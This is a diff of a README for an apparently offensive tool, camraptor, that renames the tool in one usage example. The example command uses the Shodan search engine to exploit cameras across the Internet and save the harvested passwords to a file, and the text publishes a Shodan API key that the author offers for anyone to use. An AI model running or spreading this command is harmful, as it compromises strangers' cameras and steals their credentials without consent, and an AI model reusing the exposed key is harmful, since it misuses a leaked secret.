@@ -56,7 +56,7 @@ camraptor -a 192.168.99.100
 Let's try to use Shodan search engine to exploit cameras over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
 
 ```shell
-camover -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
+camraptor -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
 ```
 
 **NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)
